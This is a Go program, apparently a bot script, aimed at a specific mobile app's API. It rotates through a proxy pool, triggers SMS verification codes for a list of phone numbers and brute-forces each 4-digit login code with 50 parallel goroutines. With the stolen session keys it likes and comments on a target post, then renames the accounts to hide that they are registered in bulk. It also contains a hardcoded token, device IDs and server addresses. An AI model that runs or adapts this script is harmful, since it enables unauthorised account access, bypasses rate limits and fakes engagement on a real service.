package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"sync"
	"time"

	"github.com/ipiao/remote"
)

var accessalbeProxys = []*remote.ProxyInfo{

	{IP: "124.193.37.5", Port: "8888", Protocol: "https"},
	// "https://124.193.37.5:8888",
	// "https://124.235.208.252:443",
	// "https://180.101.205.253:8888",
}

var users = []*User{
	// {Phone: "18458888851", Authkey: "", Comment: "小姐姐好漂亮哦", NickName: ""},
	{Phone: "18458888839", Authkey: "", Comment: "1111111", NickName: "宋--"},
	{Phone: "18458888832", Authkey: "", Comment: "火火火火火", NickName: ""},
	{Phone: "18458888827", Authkey: "", Comment: "qaq,第一第一第一", NickName: "a_6"},
	{Phone: "18458888823", Authkey: "", Comment: "路过", NickName: "陆游"},
	{Phone: "18458888873", Authkey: "", Comment: "好久不见啊", NickName: "小薇"},
}

type User struct {
	Phone    string
	Authkey  string
	Comment  string
	NickName string
	Success  bool
	Error    error
}

func main1() {
	store := remote.NewXiciRedisStore("118.25.7.38:6379", "", remote.XiciProxyTypeNT)
	store.Clear()
	err := remote.InitXiCiIppool([]int{1, 2, 3}, remote.XiciProxyTypeNT, store, "")
	if err != nil {
		panic(err)
	}
	rs, err := remote.NewProxyRemoteStoreTimeout("https://nsj-m.yy0578.com", 0, store, time.Second*3)
	if err != nil {
		panic(err)
	}

	for {
		r, err := rs.New()
		if err != nil {
			continue
		}
		req := map[string]interface{}{}
		ret := make(map[string]interface{})
		err = r.Post("/v2/imagescode/gettokennum", req, &ret)
		if err != nil {
			store.DelBad(r.ProxyInfo())
			continue
		}
		token := ret["Token"].(string)
		log.Println("gettokennum:", token, ret, r.Proxy())
	}

}

func main11() {

	comment := flag.String("m", "保持队形，送小姐姐上第一", "")
	mp := flag.Int("mp", 12, "")
	name := flag.String("n", "", "")
	np := flag.Int("np", 4, "")
	proxy := flag.String("p", "", "")

	flag.Parse()

	commentPage = *mp
	logoPage = *np

	var pi *remote.ProxyInfo

	var err error
	r := remote.NewProxyRemote2("https://nsj-m.yy0578.com", *proxy)
	// r := remote.NewRemote("https://nsj-m.yy0578.com")

	// 获取token
	req := map[string]interface{}{}
	ret := make(map[string]interface{})
	// err = r.Post("/v2/imagescode/gettokennum", req, &ret)
	// if err != nil {
	// 	panic(err)
	// }
	// log.Println("gettokennum:", ret)
	// token := ret["Token"].(string)
	token := "KOn189bBNmbo-DALJ9dGE53MK3FANl5A9_hFB7dcS4EtWrvmtLH8G34fow3tjTfRvH_F4lOJBD-qgr4Jyn0akxe61AJiDHpegfmJssy_jVk="

	// 发送短信
	phone := getPhone()
	req = map[string]interface{}{
		"deviceId":    "A0644CSC-5FFB-431B-DFD1-323C2F34537D",
		"appVersion":  "1.0.2",
		"deviceName":  "iPhone10.2(iOS11.4)",
		"code":        "3155",
		"smsCodeType": 1,
		"deviceType":  "2",
		"mobilePhone": phone,
		"token":       token,
	}
	err = r.Post("/v1/smsController/sendVerifyCode", req, &ret)
	if err != nil {
		log.Println(err)
		return
	}
	log.Println("sendVerifyCode", ret)
	time.Sleep(time.Second * 2)
	// 刷登录接口
	var authKey string
	var uid int

	gonums := 50
	done := make(chan int, gonums-1)
	wg := sync.WaitGroup{}
	for i := 0; i < gonums; i++ {
		wg.Add(1)
		go func(c int) {
			nr := remote.NewProxyRemote("https://nsj-m.yy0578.com", pi)
		OUT:
			for j := 0; j < 10000/gonums; j++ {
				select {
				case <-done:
					wg.Done()
					break OUT
				case <-time.After(time.Millisecond * 5):
					smsCode := fmt.Sprintf("%04d", c*10000/gonums+j)
					log.Println(smsCode)
					nreq := map[string]interface{}{
						"loginAccount":        phone,
						"smsVerificationCode": smsCode,
					}
					nret := map[string]interface{}{}
					err = nr.Post("/v1/userAccount/login", createRequest(nreq), &nret)
					if err != nil {
						log.Println("login err:", err)
						continue
					}
					if ak, ok := nret["authkey"]; ok {
						authKey = ak.(string)
						for k := 0; k < gonums-1; k++ {
							done <- k
						}
						log.Println("login success:", nret)
						log.Println("login smsCode:", smsCode)

						if acc, ok1 := nret["userAccount"]; ok1 {
							if accM, ok2 := acc.(map[string]interface{}); ok2 {
								if uidStr, ok3 := accM["id"]; ok3 {
									id, _ := uidStr.(json.Number).Int64()
									uid = int(id)
								}
							}
						}

						wg.Done()

						break OUT
					}
					// log.Println("login return:", nret)
				}
			}
		}(i)
	}
	wg.Wait()
	log.Println("---------------------------------------------------------------------------")

	// 点赞
	req = map[string]interface{}{
		"deviceName": "iPhone10.2(iOS11.4)",
		"deviceId":   "A0644CSC-5FFB-431B-DFD1-323C2F34537D",
		"appVersion": "1.0.2",
		"praisesRelation": map[string]interface{}{
			"detailsId":   654,
			"praisesType": 1,
		},
		"deviceType": "2",
	}
	request1, err := r.CovertRequest("POST", "/v1/bbs/addPraise", req)
	if err != nil {
		log.Println("addPraise CovertRequest error:", err)
	}
	request1.Header.Set("authkey", authKey)
	bs, err := r.CallRequest(request1)
	if err != nil {
		log.Println("CallRequest:", err)
	}
	err = remote.DeJSON(bs, &ret)
	if err != nil {
		log.Println(err)
	}
	log.Println("addPraise return:", ret)

	// 评论
	req = map[string]interface{}{
		"deviceName": "iPhone10.2(iOS11.4)",
		"deviceId":   "A0644CSC-5FFB-431B-DFD1-323C2F34537D",
		"comment": map[string]interface{}{
			"detailsId":   654,
			"commentText": *comment,
		},
		"posterId":   10000007,
		"appVersion": "1.0.2",
		"deviceType": "2",
	}
	request2, err := r.CovertRequest("POST", "/v1/bbs/addComment", req)
	if err != nil {
		log.Println(err)
	}
	request2.Header.Set("authkey", authKey)
	bs, err = r.CallRequest(request2)
	if err != nil {
		log.Println(ret)
	}
	err = remote.DeJSON(bs, &ret)
	if err != nil {
		log.Println(err)
	}
	log.Println("addComment return:", ret)

	// 改名
	nickName := *name
	if len(nickName) == 0 {
		nickName = getNickName()
	}
	avatar := getAvatarUrl()
	if nickName != "" {
		req = map[string]interface{}{
			"deviceId":   "4D5535B3-5371-48FC-884C-439A2E493EFF",
			"uid":        uid,
			"appVersion": "1.0.2",
			"deviceName": "iPhone9.2(iOS12.0)",
			"deviceType": "2",
			"sex":        "1",
			"nickName":   nickName,
			"avatarUrl":  avatar,
		}
		request3, err := r.CovertRequest("POST", "/v1/userAccount/updateUserInfoById", req)
		if err != nil {
			log.Println(err)
		}
		request3.Header.Set("authkey", authKey)
		bs, err = r.CallRequest(request3)
		if err != nil {
			log.Println(ret)
		}
		err = remote.DeJSON(bs, &ret)
		if err != nil {
			log.Println(err)
		}
		log.Println("updateUserInfoById return:", ret)
	}

	log.Println(phone, authKey, uid)

}

func getFirstOne() {

}

//**** 实现过程
// 1. 获取验证码token
// 2. 用token获取图形验证码
// 3. 解析验证码图片，得到验证码
// 3.5 前三部目前手动操作，抓包token和验证码，在第四步写死，（可以重复利用 token和图形验证码）
// 4. 根据token，验证码，随机获取一个手机号，调用短信接口（新用户会注册）
// 5. 多线程异步调用登陆接口（轮询验证码0000-9999），成功后获取uid和authkey
// 6,7 根据authkey点赞，评论指定文章
// 8. 调用改名接口，避免界面上出现连号评论
